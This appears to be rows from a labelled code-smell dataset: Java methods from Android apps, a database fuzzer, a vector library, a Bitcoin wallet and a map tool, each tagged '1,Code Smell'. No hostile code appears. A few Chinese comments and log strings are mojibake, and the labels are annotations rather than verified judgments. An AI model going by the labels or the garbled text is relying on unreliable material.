        if (!modifierComments.isEmpty()) {
          J.Modifier nextModifier=mod.withComments(ListUtils.concatAll(new ArrayList<>(modifierComments),mod.getComments()));
          modifierComments.clear();
          return nextModifier;
        }
        return mod;
      }
);
      if (!modifierComments.isEmpty()) {
        m=m.withComments(ListUtils.concatAll(m.getComments(),modifierComments));
      }
      m=maybeAutoFormat(m,m.withModifiers(modifiers),p).withBody(m.getBody());
    }
  }
  return m;
}",1,Code Smell
"public static void showForDeletion(final BaseFragment fragment,final int filterId,final Utilities.Callback<Boolean> whenDone){
  ArrayList<MessagesController.DialogFilter> myFilters=fragment.getMessagesController().dialogFilters;
  MessagesController.DialogFilter f=null;
  if (myFilters != null) {
    for (int i=0; i < myFilters.size(); ++i) {
      if (myFilters.get(i).id == filterId) {
        f=myFilters.get(i);
        break;
      }
    }
  }
  final MessagesController.DialogFilter filter=f;
  Runnable showDeleteAlert=() -> {
    TL_chatlists.TL_chatlists_getLeaveChatlistSuggestions req=new TL_chatlists.TL_chatlists_getLeaveChatlistSuggestions();
    req.chatlist=new TL_chatlists.TL_inputChatlistDialogFilter();
    req.chatlist.filter_id=filterId;
    fragment.getConnectionsManager().sendRequest(req,(res,err) -> AndroidUtilities.runOnUIThread(() -> {
      if (fragment.getParentActivity() == null) {
        return;
      }
      FolderBottomSheet sheet;
      if (res instanceof TLRPC.Vector) {
        ArrayList<Long> suggestions=new ArrayList<>();
        try {
          for (int i=0; i < ((TLRPC.Vector)res).objects.size(); ++i) {
            TLRPC.Peer peer=(TLRPC.Peer)((TLRPC.Vector)res).objects.get(i);
            suggestions.add(DialogObject.getPeerDialogId(peer));
          }
        }
 catch (        Exception ignore) {
        }
        sheet=new FolderBottomSheet(fragment,filterId,suggestions);
      }
 else {
        sheet=new FolderBottomSheet(fragment,filterId,(List<Long>)null);
      }
      sheet.setOnDone(whenDone);
      fragment.showDialog(sheet);
    }
));
  }
;
  if (filter != null && filter.isMyChatlist()) {
    AlertDialog alertDialog=new AlertDialog.Builder(fragment.getContext()).setTitle(LocaleController.getString(""FilterDelete"",R.string.FilterDelete)).setMessage(LocaleController.getString(""FilterDeleteAlertLinks"",R.string.FilterDeleteAlertLinks)).setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),(d,w) -> {
      if (whenDone != null) {
        whenDone.run(false);
      }
    }
).setPositiveButton(LocaleController.getString(""Delete"",R.string.Delete),(d,w) -> {
      showDeleteAlert.run();
    }
).create();
    fragment.showDialog(alertDialog);
    TextView button=(TextView)alertDialog.getButton(DialogInterface.BUTTON_POSITIVE);
    if (button != null) {
      button.setTextColor(Theme.getColor(Theme.key_text_RedBold));
    }
  }
 else {
    showDeleteAlert.run();
  }
}",1,Code Smell
"public static Map<String,Map<String,Set<String>>> getAnnotations(List<Tag> tags){
  Map<String,Map<String,Set<String>>> ret=new HashMap<>();
  for (  Tag tag : tags) {
    if (tag instanceof VisibilityAnnotationTag) {
      VisibilityAnnotationTag visibilityAnnotationTag=(VisibilityAnnotationTag)tag;
      for (      AnnotationTag annotationTag : visibilityAnnotationTag.getAnnotations()) {
        String type=normalize(annotationTag.getType());
        if (""kotlin.Metadata"".equals(type) || type.startsWith(""io.swagger.v3.oas.annotations.media.Schema"")) {
          continue;
        }
        Map<String,Set<String>> annotationTagInfo=new HashMap<>();
        Collection<AnnotationElem> elems=annotationTag.getElems();
        for (        AnnotationElem elem : elems) {
          String elemKey=elem.getName();
          Set<String> elemValueList=new HashSet<>();
          if (elem instanceof AnnotationArrayElem) {
            ArrayList elemValues=((AnnotationArrayElem)elem).getValues();
            for (            Object item : elemValues.stream().toArray()) {
              if (item instanceof AnnotationStringElem) {
                AnnotationStringElem annotationStringElem=(AnnotationStringElem)item;
                elemValueList.add(annotationStringElem.getValue());
              }
 else               if (item instanceof AnnotationEnumElem) {
                AnnotationEnumElem annotationEnumElem=(AnnotationEnumElem)item;
                String enumName=String.format(""%s.%s"",normalize(annotationEnumElem.getTypeName()),annotationEnumElem.getName());
                elemValueList.add(enumName);
              }
 else {
                elemValueList.add(item.toString());
              }
            }
          }
          if (elem instanceof AnnotationStringElem) {
            AnnotationStringElem annotationStringElem=(AnnotationStringElem)elem;
            elemValueList.add(annotationStringElem.getValue());
          }
          annotationTagInfo.put(elemKey,elemValueList);
        }
        ret.put(type,annotationTagInfo);
      }
    }
  }
  return ret;
}",1,Code Smell
"private List<Pair<Integer,Integer>> calcChooseSeatLevelPairList(int[][] actualSeats,List<String> chooseSeatList){
  String firstChooseSeat=chooseSeatList.get(0);
  int firstSeatX=Integer.parseInt(firstChooseSeat.substring(1));
  int firstSeatY=SEAT_Y_INT.get(firstChooseSeat.charAt(0));
  List<Pair<Integer,Integer>> chooseSeatLevelPairList=new ArrayList<>();
  chooseSeatLevelPairList.add(new Pair<>(firstSeatX,firstSeatY));
  int minLevelX=0;
  for (int i=1; i < chooseSeatList.size(); i++) {
    String chooseSeat=chooseSeatList.get(i);
    int chooseSeatX=Integer.parseInt(chooseSeat.substring(1));
    int chooseSeatY=SEAT_Y_INT.get(chooseSeat.charAt(0));
    minLevelX=Math.min(minLevelX,chooseSeatX - firstSeatX);
    chooseSeatLevelPairList.add(new Pair<>(chooseSeatX - firstSeatX,chooseSeatY - firstSeatY));
  }
  for (int i=Math.abs(minLevelX); i < 7; i++) {
    List<Pair<Integer,Integer>> sureSeatList=new ArrayList<>();
    if (actualSeats[i][firstSeatY] == 0) {
      sureSeatList.add(new Pair<>(i,firstSeatY));
      for (int j=1; j < chooseSeatList.size(); j++) {
        Pair<Integer,Integer> pair=chooseSeatLevelPairList.get(j);
        int chooseSeatX=pair.getKey();
        int chooseSeatY=pair.getValue();
        int x=i + chooseSeatX;
        if (x >= 7) {
          return Collections.emptyList();
        }
        if (actualSeats[i + chooseSeatX][firstSeatY + chooseSeatY] == 0) {
          sureSeatList.add(new Pair<>(i + chooseSeatX,firstSeatY + chooseSeatY));
        }
 else {
          break;
        }
      }
    }
    if (sureSeatList.size() == chooseSeatList.size()) {
      return sureSeatList;
    }
  }
  return Collections.emptyList();
}",1,Code Smell
"/** 
 * Try to snap, then align to neighboring buttons, given the provided coordinates. The new position is automatically applied to the View, regardless of if the View snapped or not. <p> The new position is always dynamic, thus replacing previous dynamic positions
 * @param x Coordinate on the x axis
 * @param y Coordinate on the y axis
 */
default void snapAndAlign(float x,float y){
  float MIN_DISTANCE=Tools.dpToPx(8);
  String dynamicX=generateDynamicX(x);
  String dynamicY=generateDynamicY(y);
  getControlView().setX(x);
  getControlView().setY(y);
  for (  ControlInterface button : ((ControlLayout)getControlView().getParent()).getButtonChildren()) {
    if (!canSnap(button))     continue;
    float button_top=button.getControlView().getY();
    float button_bottom=button_top + button.getControlView().getHeight();
    float button_left=button.getControlView().getX();
    float button_right=button_left + button.getControlView().getWidth();
    float top=getControlView().getY();
    float bottom=getControlView().getY() + getControlView().getHeight();
    float left=getControlView().getX();
    float right=getControlView().getX() + getControlView().getWidth();
    if (Math.abs(top - button_bottom) < MIN_DISTANCE) {
      dynamicY=applySize(button.getProperties().dynamicY,button) + applySize("" + ${height}"",button) + "" + ${margin}"";
    }
 else     if (Math.abs(button_top - bottom) < MIN_DISTANCE) {
      dynamicY=applySize(button.getProperties().dynamicY,button) + "" - ${height} - ${margin}"";
    }
    if (!dynamicY.equals(generateDynamicY(getControlView().getY()))) {
      if (Math.abs(button_left - left) < MIN_DISTANCE) {
        dynamicX=applySize(button.getProperties().dynamicX,button);
      }
 else       if (Math.abs(button_right - right) < MIN_DISTANCE) {
        dynamicX=applySize(button.getProperties().dynamicX,button) + applySize("" + ${width}"",button) + "" - ${width}"";
      }
    }
    if (Math.abs(button_left - right) < MIN_DISTANCE) {
      dynamicX=applySize(button.getProperties().dynamicX,button) + "" - ${width} - ${margin}"";
    }
 else     if (Math.abs(left - button_right) < MIN_DISTANCE) {
      dynamicX=applySize(button.getProperties().dynamicX,button) + applySize("" + ${width}"",button) + "" + ${margin}"";
    }
    if (!dynamicX.equals(generateDynamicX(getControlView().getX()))) {
      if (Math.abs(button_top - top) < MIN_DISTANCE) {
        dynamicY=applySize(button.getProperties().dynamicY,button);
      }
 else       if (Math.abs(button_bottom - bottom) < MIN_DISTANCE) {
        dynamicY=applySize(button.getProperties().dynamicY,button) + applySize("" + ${height}"",button) + "" - ${height}"";
      }
    }
  }
  setDynamicX(dynamicX);
  setDynamicY(dynamicY);
}",1,Code Smell
"/** 
 * 鎵ц鍏蜂綋鐨勬晱鎰熻瘝鏇挎崲
 * @param results
 * @param mappedStatement
 * @param sensitiveObjectMeta
 */
private void replaceSensitiveResults(Collection<Object> results,MappedStatement mappedStatement,SensitiveObjectMeta sensitiveObjectMeta){
  for (  Object obj : results) {
    if (sensitiveObjectMeta.getSensitiveFieldMetaList() == null) {
      continue;
    }
    final MetaObject objMetaObject=mappedStatement.getConfiguration().newMetaObject(obj);
    sensitiveObjectMeta.getSensitiveFieldMetaList().forEach(i -> {
      Object value=objMetaObject.getValue(StringUtils.isBlank(i.getBindField()) ? i.getName() : i.getBindField());
      if (value == null) {
        return;
      }
 else       if (value instanceof String) {
        String strValue=(String)value;
        String processVal=sensitiveService.replace(strValue);
        objMetaObject.setValue(i.getName(),processVal);
      }
 else       if (value instanceof Collection) {
        Collection listValue=(Collection)value;
        if (CollectionUtils.isNotEmpty(listValue)) {
          Optional firstValOpt=listValue.stream().filter(Objects::nonNull).findFirst();
          if (firstValOpt.isPresent()) {
            SensitiveObjectMeta valSensitiveObjectMeta=findSensitiveObjectMeta(firstValOpt.get());
            if (Boolean.TRUE.equals(valSensitiveObjectMeta.getEnabledSensitiveReplace()) && CollectionUtils.isNotEmpty(valSensitiveObjectMeta.getSensitiveFieldMetaList())) {
              replaceSensitiveResults(listValue,mappedStatement,valSensitiveObjectMeta);
            }
          }
        }
      }
 else       if (!ClassUtils.isPrimitiveOrWrapper(value.getClass())) {
        SensitiveObjectMeta valSensitiveObjectMeta=findSensitiveObjectMeta(value);
        if (Boolean.TRUE.equals(valSensitiveObjectMeta.getEnabledSensitiveReplace()) && CollectionUtils.isNotEmpty(valSensitiveObjectMeta.getSensitiveFieldMetaList())) {
          replaceSensitiveResults(newArrayList(value),mappedStatement,valSensitiveObjectMeta);
        }
      }
    }
);
  }
}
",1,Code Smell
"@Override public void executeCondition(Integer slotIndex) throws Exception {
  Slot slot=DataBus.getSlot(slotIndex);
  Node iteratorNode=this.getIteratorNode();
  if (ObjectUtil.isNull(iteratorNode)) {
    String errorInfo=StrUtil.format(""[{}]:no iterator-node found"",slot.getRequestId());
    throw new NoIteratorNodeException(errorInfo);
  }
  iteratorNode.setCurrChainId(this.getCurrChainId());
  if (!iteratorNode.isAccess(slotIndex)) {
    return;
  }
  iteratorNode.execute(slotIndex);
  Iterator<?> it=iteratorNode.getItemResultMetaValue(slotIndex);
  Executable executableItem=this.getDoExecutor();
  Executable breakItem=this.getBreakItem();
  try {
    int index=0;
    if (!this.isParallel()) {
      while (it.hasNext()) {
        Object itObj=it.next();
        executableItem.setCurrChainId(this.getCurrChainId());
        setLoopIndex(executableItem,index);
        setCurrLoopObject(executableItem,itObj);
        executableItem.execute(slotIndex);
        if (ObjectUtil.isNotNull(breakItem)) {
          breakItem.setCurrChainId(this.getCurrChainId());
          setLoopIndex(breakItem,index);
          setCurrLoopObject(breakItem,itObj);
          breakItem.execute(slotIndex);
          boolean isBreak=breakItem.getItemResultMetaValue(slotIndex);
          if (isBreak) {
            break;
          }
        }
        index++;
      }
    }
 else {
      List<CompletableFuture<LoopFutureObj>> futureList=new ArrayList<>();
      ExecutorService parallelExecutor=ExecutorHelper.loadInstance().buildLoopParallelExecutor();
      while (it.hasNext()) {
        Object itObj=it.next();
        CompletableFuture<LoopFutureObj> future=CompletableFuture.supplyAsync(new LoopParallelSupplier(executableItem,this.getCurrChainId(),slotIndex,index,itObj),parallelExecutor);
        futureList.add(future);
        if (ObjectUtil.isNotNull(breakItem)) {
          breakItem.setCurrChainId(this.getCurrChainId());
          setLoopIndex(breakItem,index);
          setCurrLoopObject(breakItem,itObj);
          breakItem.execute(slotIndex);
          boolean isBreak=breakItem.getItemResultMetaValue(slotIndex);
          if (isBreak) {
            break;
          }
        }
        index++;
      }
      handleFutureList(futureList);
    }
  }
  finally {
    removeLoopIndex(executableItem);
    removeCurrLoopObject(executableItem);
  }
}",1,Code Smell
"@Override public void onClick(View v){
  if (null == mAdapter) {
    return;
  }
  if (v == mCancel) {
    finish();
  }
 else   if (v == mOk) {
    StringBuilder sb=new StringBuilder();
    int i=0;
    boolean first=true;
    for (    boolean[] selections : mSelections) {
      for (      boolean b : selections) {
        if (b) {
          if (!first) {
            sb.append(""x"");
          }
 else {
            first=false;
          }
          sb.append(LANGUAGES[i]);
        }
        i++;
      }
    }
    String excludedLanguages=sb.toString();
    Settings.putExcludedLanguages(excludedLanguages);
    finish();
  }
 else   if (v == mSelectAll) {
    for (    boolean[] selections : mSelections) {
      int length=selections.length;
      for (int i=0; i < length; i++) {
        selections[i]=true;
      }
    }
    mAdapter.notifyDataSetChanged();
  }
 else   if (v == mDeselectAll) {
    for (    boolean[] selections : mSelections) {
      int length=selections.length;
      for (int i=0; i < length; i++) {
        selections[i]=false;
      }
    }
    mAdapter.notifyDataSetChanged();
  }
 else   if (v == mInvertSelection) {
    for (    boolean[] selections : mSelections) {
      int length=selections.length;
      for (int i=0; i < length; i++) {
        selections[i]=!selections[i];
      }
    }
    mAdapter.notifyDataSetChanged();
  }
}",1,Code Smell
"@Override public void init(){
  mPackageManagerService=findClassIfExists(""com.android.server.pm.PackageManagerService"");
  findAndHookMethod(mPackageManagerService,""systemReady"",new MethodHook(){
    @Override protected void after(    MethodHookParam param) throws Throwable {
      Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
      Handler mHandler=(Handler)XposedHelpers.getObjectField(param.thisObject,""mHandler"");
      new PrefsUtils.SharedPrefsObserver(mContext,mHandler,""prefs_key_system_framework_clean_share_apps""){
        @Override public void onChange(        String name){
          mPrefsMap.put(name,PrefsUtils.getSharedStringSetPrefs(mContext,name));
        }
      }
;
    }
  }
);
  MethodHook hook=new MethodHook(){
    @Override @SuppressWarnings(""unchecked"") protected void after(    MethodHookParam param) throws Throwable {
      try {
        if (param.args[0] == null)         return;
        Intent origIntent=(Intent)param.args[0];
        String action=origIntent.getAction();
        if (action == null)         return;
        if (!action.equals(Intent.ACTION_SEND) && !action.equals(Intent.ACTION_SENDTO) && !action.equals(Intent.ACTION_SEND_MULTIPLE))         return;
        Intent intent=(Intent)origIntent.clone();
        if (intent.getDataString() != null && intent.getDataString().contains("":""))         return;
        if (intent.hasExtra(""Cemiuiler"") && intent.getBooleanExtra(""Cemiuiler"",false))         return;
        Set<String> selectedApps=mPrefsMap.getStringSet(""system_framework_clean_share_apps"");
        List<ResolveInfo> resolved=(List<ResolveInfo>)param.getResult();
        ResolveInfo resolveInfo;
        Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        PackageManager pm=mContext.getPackageManager();
        Iterator<ResolveInfo> itr=resolved.iterator();
        while (itr.hasNext()) {
          resolveInfo=itr.next();
          boolean removeOriginal=selectedApps.contains(resolveInfo.activityInfo.packageName) || selectedApps.contains(resolveInfo.activityInfo.packageName + ""|0"");
          boolean removeDual=selectedApps.contains(resolveInfo.activityInfo.packageName + ""|999"");
          boolean hasDual=false;
          try {
            hasDual=XposedHelpers.callMethod(pm,""getPackageInfoAsUser"",resolveInfo.activityInfo.packageName,0,999) != null;
          }
 catch (          Throwable ignore) {
          }
          if ((removeOriginal && !hasDual) || removeOriginal && hasDual && removeDual)           itr.remove();
        }
        param.setResult(resolved);
      }
 catch (      Throwable t) {
        if (!(t instanceof BadParcelableException))         XposedLogUtils.logE(TAG,t);
      }
    }
  }
;
  String ActQueryService=isMoreAndroidVersion(33) ? ""com.android.server.pm.ComputerEngine"" : ""com.android.server.pm.PackageManagerService$ComputerEngine"";
  Helpers.hookAllMethods(ActQueryService,lpparam.classLoader,""queryIntentActivitiesInternal"",hook);
}",1,Code Smell
"@Override public boolean onActionItemClicked(ActionMode mode,MenuItem item){
  if (!isInSelectionMode()) {
    return true;
  }
  int itemId=item.getItemId();
  if (itemId == android.R.id.copy) {
    copyText();
    return true;
  }
 else   if (itemId == android.R.id.selectAll) {
    CharSequence text=getText(selectedView,false);
    if (text == null) {
      return true;
    }
    selectionStart=0;
    selectionEnd=text.length();
    hideActions();
    invalidate();
    AndroidUtilities.cancelRunOnUIThread(showActionsRunnable);
    AndroidUtilities.runOnUIThread(showActionsRunnable);
    return true;
  }
 else   if (itemId == TRANSLATE) {
    CharSequence textS=getSelectedText();
    if (textS == null) {
      return true;
    }
    String urlFinal=textS.toString();
    Activity activity=ProxyUtil.getOwnerActivity((((View)selectedView).getContext()));
    TranslateDb db=TranslateDb.currentTarget();
    if (db.contains(urlFinal)) {
      AlertUtil.showCopyAlert(activity,db.query(urlFinal));
    }
 else {
      AlertDialog pro=AlertUtil.showProgress(activity);
      pro.show();
      Translator.translate(urlFinal,new Translator.Companion.TranslateCallBack(){
        @Override public void onSuccess(        @NotNull String translation){
          pro.dismiss();
          AlertUtil.showCopyAlert(activity,translation);
        }
        @Override public void onFailed(        boolean unsupported,        @NotNull String message){
          pro.dismiss();
          AlertUtil.showTransFailedDialog(activity,unsupported,message,() -> {
            pro.show();
            Translator.translate(urlFinal,this);
          }
);
        }
      }
);
    }
    return true;
  }
 else   if (itemId == R.id.menu_quote) {
    quoteText();
    hideActions();
    return true;
  }
 else {
    clear();
  }
  return true;
}
@Override public boolean onActionItemClicked(ActionMode mode,MenuItem item){
  return callback.onActionItemClicked(mode,item);
}",1,Code Smell
"/** 
 * Chooses the initial centroids for clustering. The first centroid is chosen randomly from the data points. Subsequent centroids are selected with a probability proportional to the square of their distance to the nearest existing centroid. This ensures that the centroids are spread out across the data and not initialized too closely to each other, leading to better convergence and potentially improved final clusterings.
 * @return an array of initial centroids.
 */
private static VectorFloat<?> chooseInitialCentroids(VectorFloat<?>[] points,int k){
  if (k <= 0) {
    throw new IllegalArgumentException(""Number of clusters must be positive."");
  }
  if (k > points.length) {
    throw new IllegalArgumentException(String.format(""Number of clusters %d cannot exceed number of points %d"",k,points.length));
  }
  var random=ThreadLocalRandom.current();
  VectorFloat<?> centroids=vectorTypeSupport.createFloatVector(k * points[0].length());
  float[] distances=new float[points.length];
  Arrays.fill(distances,Float.MAX_VALUE);
  VectorFloat<?> firstCentroid=points[random.nextInt(points.length)];
  centroids.copyFrom(firstCentroid,0,0,firstCentroid.length());
  for (int i=0; i < points.length; i++) {
    float distance1=squareL2Distance(points[i],firstCentroid);
    distances[i]=Math.min(distances[i],distance1);
  }
  for (int i=1; i < k; i++) {
    float totalDistance=0;
    for (    float distance : distances) {
      totalDistance+=distance;
    }
    float r=random.nextFloat() * totalDistance;
    int selectedIdx=-1;
    for (int j=0; j < distances.length; j++) {
      r-=distances[j];
      if (r < 1e-6) {
        selectedIdx=j;
        break;
      }
    }
    if (selectedIdx == -1) {
      selectedIdx=random.nextInt(points.length);
    }
    VectorFloat<?> nextCentroid=points[selectedIdx];
    centroids.copyFrom(nextCentroid,0,i * nextCentroid.length(),nextCentroid.length());
    for (int j=0; j < points.length; j++) {
      float newDistance=squareL2Distance(points[j],nextCentroid);
      distances[j]=Math.min(distances[j],newDistance);
    }
  }
  assertFinite(centroids);
  return centroids;
}",1,Code Smell
"public static SQLQueryAdapter insert(YSQLGlobalState globalState){
  YSQLTable table=globalState.getSchema().getRandomTable(YSQLTable::isInsertable);
  ExpectedErrors errors=new ExpectedErrors();
  errors.add(""cannot insert into column"");
  YSQLErrors.addCommonExpressionErrors(errors);
  YSQLErrors.addCommonInsertUpdateErrors(errors);
  YSQLErrors.addCommonExpressionErrors(errors);
  errors.add(""multiple assignments to same column"");
  errors.add(""violates foreign key constraint"");
  errors.add(""value too long for type character varying"");
  errors.add(""conflicting key value violates exclusion constraint"");
  errors.add(""violates not-null constraint"");
  errors.add(""current transaction is aborted"");
  errors.add(""bit string too long"");
  errors.add(""new row violates check option for view"");
  errors.add(""reached maximum value of sequence"");
  errors.add(""but expression is of type"");
  StringBuilder sb=new StringBuilder();
  sb.append(""INSERT INTO "");
  sb.append(table.getName());
  List<YSQLColumn> columns=table.getRandomNonEmptyColumnSubset();
  sb.append(""("");
  sb.append(columns.stream().map(AbstractTableColumn::getName).collect(Collectors.joining("", "")));
  sb.append("")"");
  if (Randomly.getBooleanWithRatherLowProbability()) {
    sb.append("" OVERRIDING"");
    sb.append("" "");
    sb.append(Randomly.fromOptions(""SYSTEM"",""USER""));
    sb.append("" VALUE"");
  }
  sb.append("" VALUES"");
  if (globalState.getDbmsSpecificOptions().allowBulkInsert && Randomly.getBooleanWithSmallProbability()) {
    StringBuilder sbRowValue=new StringBuilder();
    sbRowValue.append(""("");
    for (int i=0; i < columns.size(); i++) {
      if (i != 0) {
        sbRowValue.append("", "");
      }
      sbRowValue.append(YSQLVisitor.asString(YSQLExpressionGenerator.generateConstant(globalState.getRandomly(),columns.get(i).getType())));
    }
    sbRowValue.append("")"");
    int n=(int)Randomly.getNotCachedInteger(100,1000);
    for (int i=0; i < n; i++) {
      if (i != 0) {
        sb.append("", "");
      }
      sb.append(sbRowValue);
    }
  }
 else {
    int n=Randomly.smallNumber() + 1;
    for (int i=0; i < n; i++) {
      if (i != 0) {
        sb.append("", "");
      }
      insertRow(globalState,sb,columns,n == 1);
    }
  }
  if (Randomly.getBooleanWithRatherLowProbability()) {
    sb.append("" ON CONFLICT "");
    if (Randomly.getBoolean()) {
      sb.append(""("");
      sb.append(table.getRandomColumn().getName());
      sb.append("")"");
      errors.add(""there is no unique or exclusion constraint matching the ON CONFLICT specification"");
    }
    sb.append("" DO NOTHING"");
  }
  errors.add(""duplicate key value violates unique constraint"");
  errors.add(""identity column defined as GENERATED ALWAYS"");
  errors.add(""out of range"");
  errors.add(""violates check constraint"");
  errors.add(""no partition of relation"");
  errors.add(""invalid input syntax"");
  errors.add(""division by zero"");
  errors.add(""violates foreign key constraint"");
  errors.add(""data type unknown"");
  return new SQLQueryAdapter(sb.toString(),errors);
}",1,Code Smell
"@Override protected void dispatchDraw(Canvas canvas){
  if (menuTextLayout != null) {
    boolean update=false;
    if (expanded && expandProgress != 1f) {
      expandProgress+=16f / 150f;
      if (expandProgress > 1) {
        expandProgress=1f;
      }
 else {
        invalidate();
      }
      update=true;
    }
 else     if (!expanded && expandProgress != 0) {
      expandProgress-=16f / 150f;
      if (expandProgress < 0) {
        expandProgress=0;
      }
 else {
        invalidate();
      }
      update=true;
    }
    float expandProgress=CubicBezierInterpolator.DEFAULT.getInterpolation(this.expandProgress);
    if (update && expandProgress > 0) {
      textPaint.setAlpha((int)(255 * expandProgress));
    }
    if (drawBackgroundDrawable) {
      rectTmp.set(0,0,AndroidUtilities.dp(40) + (menuTextLayout.getWidth() + AndroidUtilities.dp(4)) * expandProgress,getMeasuredHeight());
      canvas.drawRoundRect(rectTmp,AndroidUtilities.dp(16),AndroidUtilities.dp(16),paint);
      backgroundDrawable.setBounds((int)rectTmp.left,(int)rectTmp.top,(int)rectTmp.right,(int)rectTmp.bottom);
      backgroundDrawable.draw(canvas);
    }
    if (isWebView) {
      canvas.save();
      canvas.translate(AndroidUtilities.dp(9.5f),AndroidUtilities.dp(6));
      RLottieDrawable drawable=webViewAnimation;
      drawable.setBounds(0,0,drawable.width,drawable.height);
      drawable.draw(canvas);
      canvas.restore();
      if (drawable.isRunning()) {
        invalidate();
      }
    }
 else {
      canvas.save();
      canvas.translate(AndroidUtilities.dp(8),AndroidUtilities.dp(4));
      backDrawable.draw(canvas);
      canvas.restore();
    }
    if (expandProgress > 0) {
      canvas.save();
      canvas.translate(AndroidUtilities.dp(34),(getMeasuredHeight() - menuTextLayout.getHeight()) / 2f);
      menuTextLayout.draw(canvas);
      canvas.restore();
    }
    if (update) {
      onTranslationChanged((menuTextLayout.getWidth() + AndroidUtilities.dp(4)) * expandProgress);
    }
  }
  super.dispatchDraw(canvas);
}",1,Code Smell
"private void updateBlockTransactionInputs(Map<Sha256Hash,BlockTransaction> inputTransactions){
  List<TransactionOutput> outputs=new ArrayList<>();
  int foundSigs=0;
  for (  TransactionInput input : inputsForm.getTransaction().getInputs()) {
    if (input.hasWitness()) {
      foundSigs+=input.getWitness().getSignatures().size();
    }
 else {
      foundSigs+=input.getScriptSig().getSignatures().size();
    }
    if (input.isCoinBase()) {
      long totalAmt=0;
      for (      TransactionOutput output : inputsForm.getTransaction().getOutputs()) {
        totalAmt+=output.getValue();
      }
      total.setValue(totalAmt);
      signatures.setText(""N/A"");
      addCoinbasePieData(inputsPie,totalAmt);
      return;
    }
 else {
      BlockTransaction inputTx=inputTransactions.get(input.getOutpoint().getHash());
      if (inputTx == null) {
        inputTx=inputsForm.getInputTransactions().get(input.getOutpoint().getHash());
      }
      if (inputTx == null) {
        if (inputsForm.allInputsFetched()) {
          throw new IllegalStateException(""Cannot find transaction for hash "" + input.getOutpoint().getHash());
        }
 else {
          total.setText(""Unknown ("" + inputsForm.getMaxInputFetched() + "" of ""+ inputsForm.getTransaction().getInputs().size()+ "" inputs fetched)"");
          return;
        }
      }
      TransactionOutput output=inputTx.getTransaction().getOutputs().get((int)input.getOutpoint().getIndex());
      outputs.add(output);
    }
  }
  long totalAmt=0;
  for (  TransactionOutput output : outputs) {
    totalAmt+=output.getValue();
  }
  total.setValue(totalAmt);
  signatures.setText(foundSigs + ""/"" + foundSigs);
  addPieData(inputsPie,outputs);
}",1,Code Smell
"@Override public void hadamardProductInPlace(Tensor other,DoubleUnaryOperator f){
  if (other instanceof SparseVector) {
    SparseVector otherVec=(SparseVector)other;
    if (otherVec.size() != size) {
      throw new IllegalArgumentException(""Can't hadamard product two vectors of different dimension, this = "" + size + "", other = ""+ otherVec.size());
    }
 else     if (otherVec.numActiveElements() > 0) {
      int i=0;
      Iterator<VectorTuple> otherItr=otherVec.iterator();
      VectorTuple tuple=otherItr.next();
      while (i < (indices.length - 1) && otherItr.hasNext()) {
        if (indices[i] == tuple.index) {
          values[i]*=f.applyAsDouble(tuple.value);
          i++;
          tuple=otherItr.next();
        }
 else         if (indices[i] < tuple.index) {
          i++;
        }
 else {
          tuple=otherItr.next();
        }
      }
      for (; i < indices.length - 1; i++) {
        if (indices[i] == tuple.index) {
          values[i]*=f.applyAsDouble(tuple.value);
        }
      }
      while (otherItr.hasNext()) {
        if (indices[i] == tuple.index) {
          values[i]*=f.applyAsDouble(tuple.value);
        }
        tuple=otherItr.next();
      }
      if (indices[i] == tuple.index) {
        values[i]*=f.applyAsDouble(tuple.value);
      }
    }
  }
 else   if (other instanceof DenseVector) {
    DenseVector otherVec=(DenseVector)other;
    if (otherVec.size() != size) {
      throw new IllegalArgumentException(""Can't hadamard product two vectors of different dimension, this = "" + size + "", other = ""+ otherVec.size());
    }
    for (int i=0; i < indices.length; i++) {
      values[i]*=f.applyAsDouble(otherVec.get(indices[i]));
    }
  }
 else {
    throw new IllegalArgumentException(""Invalid Tensor subclass "" + other.getClass().getCanonicalName() + "" for input"");
  }
}",1,Code Smell
"private static void recordFarmGame(GameType gameType){
  try {
    JSONObject jo=new JSONObject(AntFarmRpcCall.initFarmGame(gameType.name()));
    if (""SUCCESS"".equals(jo.getString(""memo""))) {
      if (jo.getJSONObject(""gameAward"").getBoolean(""level3Get"")) {
        return;
      }
      if (jo.optInt(""remainingGameCount"",1) == 0) {
        return;
      }
      jo=new JSONObject(AntFarmRpcCall.recordFarmGame(gameType.name()));
      if (""SUCCESS"".equals(jo.getString(""memo""))) {
        JSONArray awardInfos=jo.getJSONArray(""awardInfos"");
        StringBuilder award=new StringBuilder();
        for (int i=0; i < awardInfos.length(); i++) {
          JSONObject awardInfo=awardInfos.getJSONObject(i);
          award.append(awardInfo.getString(""awardName"")).append(""*"").append(awardInfo.getInt(""awardCount""));
        }
        if (jo.has(""receiveFoodCount"")) {
          award.append("";鑲ユ枡*"").append(jo.getString(""receiveFoodCount""));
        }
        Log.farm(""搴勫洯娓告垙馃幃["" + gameType.gameName() + ""]#""+ award);
        if (jo.optInt(""remainingGameCount"",0) > 0) {
          recordFarmGame(gameType);
        }
      }
 else {
        Log.i(TAG,jo.toString());
      }
    }
 else {
      Log.i(TAG,jo.toString());
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""recordFarmGame err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"@Override public void readFeatures(Consumer<SimpleFeature> next) throws Exception {
  long id=0;
  var tables=tableNames();
  for (int i=0; i < tables.size(); i++) {
    String table=tables.get(i);
    LOGGER.trace(""Naturalearth loading {}/{}: {}"",i,tables.size(),table);
    try (Statement statement=conn.createStatement()){
      @SuppressWarnings(""java:S2077"") ResultSet rs=statement.executeQuery(""SELECT * FROM %s;"".formatted(table));
      String[] column=new String[rs.getMetaData().getColumnCount()];
      int geometryColumn=-1;
      for (int c=0; c < column.length; c++) {
        String name=rs.getMetaData().getColumnName(c + 1);
        column[c]=name;
        if (""GEOMETRY"".equals(name)) {
          geometryColumn=c;
        }
      }
      if (geometryColumn >= 0) {
        while (rs.next()) {
          byte[] geometry=rs.getBytes(geometryColumn + 1);
          if (geometry == null) {
            continue;
          }
          Geometry latLonGeometry=GeoUtils.WKB_READER.read(geometry);
          SimpleFeature readerGeometry=SimpleFeature.create(latLonGeometry,HashMap.newHashMap(column.length - 1),sourceName,table,++id);
          for (int c=0; c < column.length; c++) {
            if (c != geometryColumn) {
              Object value=rs.getObject(c + 1);
              String key=column[c];
              readerGeometry.setTag(key,value);
            }
          }
          next.accept(readerGeometry);
        }
      }
    }
   }
}",1,Code Smell
